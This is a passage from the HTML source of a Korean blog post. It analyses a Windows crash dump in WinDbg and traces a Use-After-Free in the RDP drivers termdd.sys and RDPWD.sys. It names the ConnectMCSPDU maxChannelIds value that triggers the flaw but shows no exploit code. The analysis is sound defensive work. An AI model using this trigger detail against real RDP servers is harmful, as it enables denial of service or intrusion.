class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>srv\\<span class=\"token operator\">**</span><span class=\"token operator\">*</span>         <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   심볼 캐쉬 저장할 경로와 심볼 파일이         <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     존재하는 경로 <span class=\"token punctuation\">(</span>\\<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> asterisk<span class=\"token punctuation\">)</span> 구분자를 통해  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     구분한다<span class=\"token punctuation\">.</span>                                   <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></code></pre></div>\n<p>심볼 설정을 로드 한 후 지정한 심볼 캐시가 저장될 경로에는 메모리 덤프를\n진행한후 심볼 캐시가 남아있는 모습을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA+UlEQVQY02XQ21KDMBCAYR7B8UIsTTbZEE6isCSpMDiOhyljBRnthe//Kiql1dr/dufbzcS76T7DdgTGGeMAIISAKUQUQjLGpJSccyGElBKO8y7Oz5SA+zvrLCkVIkqcIqqIKEmSoiiyLENErTUe5wVBECX5dmz7zXOSZEKAnCKi1WpVEhlrrbGcc3mSt1hc6ih979tx6PL8GmDGxpi6vq2ocs5Z94MR8T9eLoMovvoY2qFfp2kG4hc3TV1VE7bT5VPMGFNhvH1rXl+eoijefcz+ck0zNrtnH6Yz9n0fVdhvHrr1o9b6MC6JnHNlWRKRMQYAlFJ/t3/jL5VIQEZowl1QAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image47\"\n        title=\"image47\"\n        src=\"/static/c891bde5d422a33711af6f5d4767433b/32056/image47.png\"\n        srcset=\"/static/c891bde5d422a33711af6f5d4767433b/e9ff0/image47.png 180w,\n/static/c891bde5d422a33711af6f5d4767433b/f21e7/image47.png 360w,\n/static/c891bde5d422a33711af6f5d4767433b/32056/image47.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>4. windbg 메모리 덤프 로딩</strong></p>\n<p>심볼 설정을 마치고 windbg에서는 심볼을 다운로드가 완료된 후 !analyze -v\n명령을 통해 메모리 덤프 파일의 상세 정보를 출력한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABw0lEQVQoz52NbW+aUBSA+f9ftyXOt0rrW7M/sC6tZhprV61SFURAQPAKhcvbvQoowl1067Iu/bQnT05ykvPkUO3eoPPAdB5GzJQbMbMRwzLTOccLgqQIS0VcqqKsnuZSXSqaqgNVB6s14GVtNOYoVVt7nj9huZt277bzeNPqf231v/dHd93hbXd41x227sffOoN2b3A/nPwYs48M2xtOFN04phnFcnPXgZKsPbHSTNSeeeWZV2aiNhVWk4Uqr6ECHGVzUgbwl6JuOcGWEEJxc17X9ZWmQ9vyPcf3HAdangsdaHuug5EfR+Ex2R+TfZocsiwlr6RpRoGNscVYB8acX7iuEwQoQMiGtmVZ5ssLwhghHAQoDMPtdrfbhdmZ33EYxYSQNTDGY0YQBEmSxLOSJBmGASF0XTeO4+yVN5/DaE8IsWzILxYAANM0IYSBfwJjHEVRkiR/N2/iKD7FjucDsDFNMwiCY5qm7xy/F+/CiBCCEHY9DyGEEd6GMY6S5Pgv6Zk/6+GQUPtDQv4XqlAs1xvNWr1xeVUtFUvlUuWyel2tfSle1POFSpmulC+uaLqSK9G1Rr3ZaBbK9IePn3Kf87l84SfN2VDouVCZFQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image48\"\n        title=\"image48\"\n        src=\"/static/51ede3fb1e4257f0bb7e07559516e64b/d8f62/image48.png\"\n        srcset=\"/static/51ede3fb1e4257f0bb7e07559516e64b/e9ff0/image48.png 180w,\n/static/51ede3fb1e4257f0bb7e07559516e64b/f21e7/image48.png 360w,\n/static/51ede3fb1e4257f0bb7e07559516e64b/d8f62/image48.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABXElEQVQoz5WQaUvDQBCG9///ExHUooJYWukXsYf9YGzpkWY3l+bYK9ns0bpJtMVPFcU+8zIwA+/MMGDjrhfz2WI+e3Ucb+Mib7MPd58RRAgFEHoBgm9RSEl+JHB2Ozi/e7y4H150R5fd4c1g2ulPOr1xpz+5fni+6k+veqPL7tPtYHr9MDkS8MMYBjHhAtPyPcNpzgqheCm5UFxILqqyMru6NR/N9odAba3RWitFMGaUcs6MVkZpfWgqWUkp218A7tqFEPkIpWlWFIUQJeeMc84Yq+u6/RPgOC/j8Xi5XK7WqyRJwjAIAj8Kw8D38yzDeS6lNMYopay1x+a3OIYQUcaEELvdbmv2bA9orc13abRW1h4fAiohyqKs66Y9HcAozbOcc26Madu2aU6YAighWZrFcRxFUZIkURRWVXWY8g8zwRhB6HkeoaRpGmvt/5cDzliwf62PCT7p5i/zJxsGpUFmzdXxAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image49\"\n        title=\"image49\"\n        src=\"/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/32056/image49.png\"\n        srcset=\"/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/e9ff0/image49.png 180w,\n/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/f21e7/image49.png 360w,\n/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/32056/image49.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>5. 예외 발생 위치 분석</strong></p>\n<p>메모리 덤프 파일에서 볼 수 있듯이 termdd!IcaBufferAllocEx. 함수에서\n오류가 발생한다. 해당주소의 명령어는 fxffff880-0x11c9722에서 포인터를\n읽으려고 시도한다. 다음 명령어는 포인터가 qword 가리키는 점을 참조하여\n그 값을 0과 비교한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABaElEQVQoz32SCYqDQBBFvf/RAoGQReMajLhmG7t6cYn+oZokM8nAFDyqFXz8rtJxXRfMZrPBbrdDWZZo2xZd10EIAa01pJQwxoBrnuc//LwHHJZ5ngff921nCQvqukaaprYPw4D/6inlcljERFFkE7KA07D4crngdru9Uk7T9MZnQiuM49jKDoeDFT+FzOl0ss8sZpRSD7mC0QrSDFD99DYKZ7/fW1EYhjZhVVUgIktRFGiaxp61UriPI8YH9/uIYZww3Od3oR8EYOIkget5OGYZlNaWqq6RFwVaISCUAvU9SMrHnAlCD5DdR8IkCMAckwSB66LKcxgiqLZFU5Zo8hzUthDHI/RmCyMltDHojIHuRpiBhfOvKy8W2C+XiFYr229ZhvF6ha5rFL6PdLtF6rooVivQeg3F6XiWSkKYEdTPbxt3gihCGMfg7ochDmmK5ny2H30J8YJ48/xvEtkrE4+BJAQpu6wn30y6q3uLqd4+AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image50\"\n        title=\"image50\"\n        src=\"/static/27ef0e40a41a7acc083a70a47b79484d/0a47e/image50.png\"\n        srcset=\"/static/27ef0e40a41a7acc083a70a47b79484d/e9ff0/image50.png 180w,\n/static/27ef0e40a41a7acc083a70a47b79484d/f21e7/image50.png 360w,\n/static/27ef0e40a41a7acc083a70a47b79484d/0a47e/image50.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>6. 호출 스택 분석</strong></p>\n<p>호출 스택 부분을 보면 termdd.sys 파일 내부에 IcaBufferAllocEx 함수가\nRDPWD.sys 드라이버에서 호출되며 NM_Disconnect 함수가 다시 호출되어\n세션이 끊어짐과 동시에 오류가 발생하는 것을 알 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABiklEQVQoz6VS7Y6bMBDk/d/qQgIGG9sQCBdFUXtcuAQE5ivJqSF4KvtO/d92pJV3Zq3xSh7n9P6uLpcL6rrWj8cDBlprLMtiy/R/U85HWaq6rtE0je66DrfbDf+MZYFzOB7bn29vaJTSbdehH0aM04RuGNAPgz2HacIwfenDOFrter9jul4tN/r4+YkFgEPdVS8Dgi1jmq5d7ITAPkkQrFZgnofQdcEJAfnm3PetlksJ4fvgngfJGH68rLCEFI7wvF4SgpiGmm3W9uJOCmtgjLjvIQ4C0M0anPgQQYDQXf0xjAlBxjn6osCvqoLDOG9lLCGTWEdmu8MB2yxDyBiSNAWXwszAOAeXEjSK4AUE+X6PbLcDFwLxdouyqnCfZzhRxJSUwgw0pRR5/oo0TRGYrSgFIQQR5/AJAWVffON5yPMcWZZBcI44TnA8Hm0qnKIoVFVV+Dif9ak84Xy+oG1bKNWhVQpKKXRdbzWTAsNNbz9oGGwq5nmGiZyNTVmWqmkadErp5/NpX/kf/AZ6xpXaFkhXrgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image51\"\n        title=\"image51\"\n        src=\"/static/9783993b41126d7246854b96881c1a44/d8f62/image51.png\"\n        srcset=\"/static/9783993b41126d7246854b96881c1a44/e9ff0/image51.png 180w,\n/static/9783993b41126d7246854b96881c1a44/f21e7/image51.png 360w,\n/static/9783993b41126d7246854b96881c1a44/d8f62/image51.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>파일<span class=\"token operator\">**</span>       <span class=\"token operator\">|</span> <span class=\"token operator\">**</span>내용<span class=\"token operator\">**</span>                                           <span class=\"token operator\">|</span>\n<span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span><span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>RDPWD<span class=\"token punctuation\">.</span>sys<span class=\"token operator\">**</span>  <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   RDP 터미널 스택 드라이버                       <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>termdd<span class=\"token punctuation\">.</span>sys<span class=\"token operator\">**</span> <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   RDP의 구성 요소 및 터미널 서버 드라이버        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>                                                    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   마우스 및 키보드 드라이버는 termdd<span class=\"token punctuation\">.</span>sys를 통해  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>     통신한다<span class=\"token punctuation\">.</span>                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>                                                    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   마우스 및 키보드 작업에 대한 메시지를 RDP      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>     드라이버와 주고받는다<span class=\"token punctuation\">.</span>                         <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>                                                    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   RDP 클라이언트 세션을 원격으로 사용하고        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>     커뮤니케이션이 가능하다<span class=\"token punctuation\">.</span>                       <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></code></pre></div>\n<p><strong>7. 오류 발생 흐름도</strong>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADkElEQVQ4y2WSa0xTBxiG31M6fijBXZi7hEHvp6c950BbSk/XQNnmZYpkQWFT6YQxpkRkErOY6calA7kUOCb+mMPL9mObJhhNxtwwG4smDipDjXPoRgNMhUY3bAKMEETabzm6mBm+5Pn35cl3ecFaMsFZXQlWXkoXBInjBTcriG4TL7p1GaJbJ/KSneclu4WXHDpTujFZL+qMrF3keMnBWaU0jpecLJcZ99AjAWmOnDgAqCrKxcnmUnxZX4of5K04daQco++9hXOrclHtzUXnuwU4u6U6adxXbu96R06o3lWG5ak2WMSXodVboTeKMFsyAZZzdulNjo5A5XothZqeudv90XP3zuxZPvt385O0vcg74ytmCVC1/jy8Tb45e0v+c2aweXTmRm1/eF3j7/+g6mRvnEbLQWcQYOacQJZ37cjKNYX0Vc2mYzTU0TjX196+EJRbaSDQ+teBrQdvbyhOARGartxp3R+eo2+7z1Pb+Bz5r0a2+69Pov63u2rO6sZDlJVtWf0OZw49nyK+UvJmPogINHsG7U2VwFLTi7CvXtLS0Ym9wXDWvmuRo+0Dtw40DEYO1Zy/aavpG0Nt3xiD/5fOYLO/lMpLNpvnWeAJfCF/zAQ+3MHEL9HALrotNoszSemrH11AU2gKB4MhNIamUXchjLqLdxj/wO3HfNDq05GcYoWOlVCxcQ2IvsFqbzajMTqV77OsxfWUmPkaKo6dVTWHptSf9o+oG4em1LUXwszeSxPAEGHYtw3jvjLsev8wlM+o/gOPMD+CM3Oup5N1NpTmr8D94+Ug6kGsZCMTKypiCMDn18IqEDHKndsmKQ4GowNmThG5HmBkHWAFF2MWXMhYtTJJdOfEr12RDaJ8kD8PUYsPsYJCxDZtBsUnorN3EATEE7CsZZoeX18RmswZKhObAdbsLDBYHKcNZruARB51BQ4V7V7HRD2bEV1f+MJ8cYlGEbVeDO/ZH5rsCQxPf9dwdeL4ImGaLUstpHsgiO6a7FffoOINeUG6LAfm+9rkaG+LHL0sB2JHK76Olr2drczTdGP2yqHhCJ0IDtK+8XlaJBTSPGqr4IaFl3Z7sl6nDKf3J6IJ1diJHcuiPTsTYqcrE+eoJZ5US9F9fwF1f0w3yNcnLn32y8i5T4amf1wkNBjtMJgcYLlMe6pW3KLR29xEfkS6qkDBDxD7ficW7tViwpPHKJk9peT2AWH8SoR/AQaCd0YA0iH7AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image52\"\n        title=\"image52\"\n        src=\"/static/ac276d6e7746d2888cb961261912dfc0/d8f62/image52.png\"\n        srcset=\"/static/ac276d6e7746d2888cb961261912dfc0/e9ff0/image52.png 180w,\n/static/ac276d6e7746d2888cb961261912dfc0/f21e7/image52.png 360w,\n/static/ac276d6e7746d2888cb961261912dfc0/d8f62/image52.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Luigi Auriemma가 처음 보고한 바와 같이 Use-After-Free 취약성은 5이하의\n값으로 설정되었을 때 T.125 ConnectMCSPDU 패킷의 maxChannelids 필드에서\n오류가 발생한다는 사실을 알 수 있다. 해당 문제는\nRDPWD!NM_Disconnect시작하는 동안 사용자의 접속을 끊고 발생되지만 메모리\n덤프를 통해서 알아본 결과 exploit 코드로 인해 발생하는 문제는\ntermdd!IcaBufferAlloc 에 표시된 것을 확인할 수 있다.</p>\n<h1 id=\"결론\" style=\"position:relative;\"><a href=\"#%EA%B2%B0%EB%A1%A0\" aria-label=\"결론 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path 